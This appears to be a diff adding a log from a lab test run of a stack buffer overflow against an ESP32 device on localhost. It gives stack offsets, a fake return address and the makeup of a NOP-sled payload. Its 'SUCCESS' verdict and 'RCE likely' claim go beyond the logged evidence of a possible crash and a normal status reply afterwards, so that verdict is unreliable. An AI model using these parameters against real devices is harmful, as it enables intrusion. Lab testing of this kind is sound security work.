@@ -1,0 +1,56 @@
+
+============================================================
+  Suite 5 — ESP32 Overflow  |  localhost:15011
+============================================================
+
+Verifying connection to localhost:15011 ...
+⚠️  Connected but unexpected response: 
+
+  ┌────────────────────────────────────────────────────────────────┐
+  │  [1mSuite 5 — ESP32 BUFFER OVERFLOW: Stack Smash → Code Execution[0m │
+  │  [2mTarget: localhost:15011  |  Buffer: 128B  |  CWE-120 / CWE-787  |  CVSS 9.8[0m│
+  └────────────────────────────────────────────────────────────────┘
+
+  [2mCortex-M3 stack layout:[0m
+  [2m  [128B cmd_buf] [4B saved R7] [4B saved LR] ← overflow here[0m
+  [2m  LR offset: 132 bytes from buffer start[0m
+  [2m  Fake return addr: 0x20000080 (mid-SRAM NOP sled)[0m
+
+  [2m── Step 1 — Baseline: send normal STATUS command ───────[0m
+  [2m[+ 3.208s][0m [96m→ HUB:[0m  [2mvia localhost:15011[0m    [1mSTATUS[0m
+  [2m[+11.368s][0m [92m← ESP32:[0m  STATUS:OK
+
+  [2m── Step 2 — Probe buffer boundary with increasing payloads [0m
+  [2m[+11.368s][0m [96m→[0m Sending 64 bytes ... [92mOK[0m  (ERROR:UNKNOWN:)
+  [2m[+15.540s][0m [96m→[0m Sending 128 bytes ... [92mOK[0m  (ERROR:UNKNOWN:AAAAAAAAAAAAAAAAAAAAAAAAAA)
+  [2m[+19.698s][0m [96m→[0m Sending 132 bytes ... [92mOK[0m  (ERROR:UNKNOWN:AAAAAAAAAAAAAAAAAAAAAAAAAA)
+  [2m[+23.857s][0m [96m→[0m Sending 140 bytes ... [92mOK[0m  (ERROR:UNKNOWN:AAAAAAAAAAAAAAAAAAAAAAAAAA)
+  [2m[+28.016s][0m [96m→[0m Sending 160 bytes ... [92mOK[0m  (ERROR:UNKNOWN:AAAAAAAAAAAAAAAAAAAAAAAAAA)
+
+  [2m── Step 3 — Send crafted overflow payload with NOP sled + shellcode [0m
+  [2m[+32.682s][0m [95mPayload size:[0m 137 bytes
+  [2m[+32.682s][0m [95mNOP sled:[0m     32 bytes (Thumb NOPs)
+  [2m[+32.682s][0m [95mShellcode:[0m    'VESPER_PWNED' marker
+  [2m[+32.682s][0m [95mPadding:[0m      88 bytes
+  [2m[+32.682s][0m [95mFake LR:[0m      0x20000081 (Thumb bit set)
+
+  [2m[+32.682s][0m [96m→[0m Sending exploit payload ...
+
+  [2m── Step 3b — Exploit response (0 bytes) ────────────────[0m
+  [91m◄ Device unresponsive — crash/reboot probable[0m
+
+  [2m── Step 4 — Post-exploitation: probe device state ──────[0m
+  [2m[+45.844s][0m [96m→ HUB:[0m    [1mSTATUS[0m
+  [2m[+54.002s][0m [92m← ESP32:[0m  STATUS:OK
+
+Result — ESP32 Buffer Overflow (Stack Smash → RCE)
+  Severity: [91mCRITICAL[0m  (CVSS 9.8)
+  Status:   [92m✓ SUCCESS[0m
+  Evidence:
+    1. Baseline response: STATUS:OK
+    2. Boundary probing inconclusive — proceeding with full exploit
+    3. Device unresponsive after payload — likely crashed (DoS achieved)
+    4. Post-exploit STATUS: STATUS:OK
+  Impact:   Stack buffer overflow triggers crash/DoS — RCE likely with refined payload
+  Duration: 50794ms
+
